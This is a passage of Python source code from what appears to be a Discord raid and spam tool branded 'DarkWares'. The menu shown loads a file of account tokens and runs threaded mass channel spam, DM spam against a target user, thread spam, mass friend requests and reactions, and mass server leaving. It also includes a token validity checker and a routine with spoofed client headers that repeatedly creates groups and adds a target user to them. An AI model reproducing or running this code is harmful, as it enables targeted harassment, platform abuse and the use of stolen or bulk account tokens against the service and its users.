				threading.Thread(target=fastspam, args=(token, channel_id, msg, antispam)).start()
		else:
			if antispam == "y":
				antispam = True
			else:
				antispam = False
			delay = int(delay)/1000
			threading.Thread(target=spam, args=(tokens, channel_id, msg, antispam, delay)).start()
			clearConsole()
	elif choice == '3':
		RPC.update(state='The ghost of DarkWares🐱‍👤', details=('dsc.gg/darkwares'), large_image='logo', large_text='In menu...', start=start_time)
		tokens = open("tokens.txt", "r").read().splitlines()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Guild ID: ')
		guild_id = input()
		for token in tokens:
			threading.Thread(target=leave, args=(guild_id, token)).start()
			clearConsole()
	elif choice == '4':
		RPC.update(state='The ghost of DarkWares🐱‍👤', details=('dsc.gg/darkwares'), large_image='logo', large_text='In menu...', start=start_time)
		tokens = open("tokens.txt", "r").read().splitlines()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Channel ID [>]: ')
		channel_id = input()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Message ID [>]: ')
		message_id = input()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Add reaction, or remove? [add/rem] ')
		addorrem = input()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Emoji [example: :clown:] [>]: ')
		emoji = input()
		for token in tokens:
			threading.Thread(target=reaction, args=(channel_id, message_id, addorrem, emoji, token)).start()
		clearConsole()
	elif choice == '19':
		def mainHeader(token):
			return {
				"authorization": token,
				"accept": "*/*",
				'accept-encoding': 'gzip, deflate, br',
				"accept-language": "en-GB",
				"content-length": "90",
				"content-type": "application/json",
				"cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
				"origin": "https://discord.com",
				"sec-fetch-dest": "empty",
				"sec-fetch-mode": "cors",
				"sec-fetch-site": "same-origin",
				"user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
				"x-debug-options": "bugReporterEnabled",
				"x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
			}
		os.system('cls')
		loading_print(f'{Fore.RED}|{Fore.WHITE} Token [>]:')
		token = input()
		loading_print(f'{Fore.RED}|{Fore.WHITE} User id [>]:')
		UserID = input()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Group Names [>]: ')
		group = input()
		loading_print(f'{Fore.RED}|{Fore.WHITE} How many groups [>]: ')
		manygr = int(input())

		headers = mainHeader(token)


		for i in range(manygr):
				try:
					r = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers,
									json={"recipients": []})

					jsr = json.loads(r.content)
					groupID = jsr['id']
					time.sleep(0.5)
					r1 = requests.patch(f'https://discord.com/api/v9/channels/{groupID}', headers=headers,
										json={'name': group})
					if r1.status_code == 200:
						print(f'{Fore.RED}|{Fore.WHITE} Group created ')

					with open("utilities/QR/groups.txt", "w") as groupID:
						groupID.write(jsr['id'] + '\n')

				except:
					print(f'{Fore.RED}[!]{Fore.WHITE} RateLimited for {jsr["retry_after"]} seconds'), time.sleep(jsr['retry_after'])

				scrIds = random.choice(open('utilities/QR/groups.txt').readlines())
				grID = scrIds.strip('\n')
				r2 = requests.put(f'https://discord.com/api/v9/channels/{grID}/recipients/{UserID}',
								headers={'Authorization': token})
				if r2.status_code == 204:
					print(f'{Fore.RED}[>]{Fore.RESET} {UserID} added to group')
					clearConsole()

					
		
	elif choice == "5":
		RPC.update(state="dsc.gg/darkwares", details="Loaded " + str(len(tokens)) + " tokens.", large_image="logo", large_text="Spamming threads with " + str(len(tokens)) + " tokens...", start=start_time)
		tokens = open("tokens.txt", "r").read().splitlines()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Channel ID [>]: ')
		channel_id = input()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Thread name [>]: ')
		thread_name = input()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Message [>]: ')
		message = input()
		for token in tokens:
			threading.Thread(target=thread_spammer, args=(channel_id, message, thread_name, token)).start()
		clearConsole()

		
	elif choice == "6":
		RPC.update(state="dsc.gg/darkwares", details="Loaded " + str(len(tokens)) + " tokens.", large_image="logo", large_text="MassFriending with " + str(len(tokens)) + " tokens...", start=start_time)
		tokens = open("tokens.txt", "r").read().splitlines()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Discord Username + Discriminator [example: Tajfun#0000] [>]: ')
		user = input()
		for token in tokens:
			threading.Thread(target=friender, args=(token, user)).start()
		clearConsole()

		
	elif choice == "7":
		RPC.update(state="dsc.gg/darkwares", details="Loaded " + str(len(tokens)) + " tokens.", large_image="logo", large_text="DM spamming with " + str(len(tokens)) + " tokens...", start=start_time)
		tokens = open("tokens.txt", "r").read().splitlines()
		loading_print(f'{Fore.RED}|{Fore.WHITE} User ID [>]: ')
		user_id = input()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Message [>]: ')
		message = input()
		for token in tokens:
			threading.Thread(target=dmspammer, args=(token, user_id, message)).start()	
		clearConsole()

			
	elif choice == "8":
		RPC.update(state='The ghost of DarkWares🐱‍👤', details=('dsc.gg/darkwares'), large_image='logo', large_text='In menu...', start=start_time)
		tokens = ""
		with open("tokens.txt") as f:
			for line in f:
				token = line.strip("\n")
				headers = {'Content-Type': 'application/json', 'authorization': token}
				url = "https://discordapp.com/api/v6/users/@me/library"
				r = requests.get(url, headers=headers)
				if r.status_code == 200:
					print(f"{Fore.WHITE}[+] " + token)
					tokens += token + "\n"
				else:
					print(f"{Fore.RED}[-] " + token)
		open("tokens.txt", "w").write(tokens[:-1])
		clearConsole()
	elif choice == '14':
		RPC.update(state='The ghost of DarkWares🐱‍👤', details=('dsc.gg/darkwares'), large_image='logo', large_text='In menu...', start=start_time)
		loading_print(f'{Fore.RED}|{Fore.WHITE} Main developer : Mory ( The ghost of DarkWares ) ')
	elif choice == "9":
		RPC.update(state='The ghost of DarkWares🐱‍👤', details=('dsc.gg/darkwares'), large_image='logo', large_text='In menu...', start=start_time)
		tokens = open("tokens.txt", "r").read().splitlines()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Message [>] ')
		text = input()
		for token in tokens:
			threading.Thread(target=dnb, args=(token.replace("\n",""), text)).start()
		clearConsole()

		
	elif choice == "10":		
		RPC.update(state='The ghost of DarkWares🐱‍👤', details=('dsc.gg/darkwares'), large_image='logo', large_text='In menu...', start=start_time)
		tokens = open("tokens.txt", "r").read().splitlines()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Status [>]: ')
		bio = input()
		for token in tokens:
			threading.Thread(target=set_bio, args=(token.replace("\n",""), bio)).start()
		clearConsole()
	elif choice == '13':
		print(f"{Fore.RED}│{Fore.WHITE} WEBHOOK URL [>]: ")
		url=input("")
		print(f"{Fore.RED}│{Fore.WHITE} WEBHOOK MESSAGE [>]: ")
		msg=input("")
		webhooker(url,msg)
	clearConsole()

	
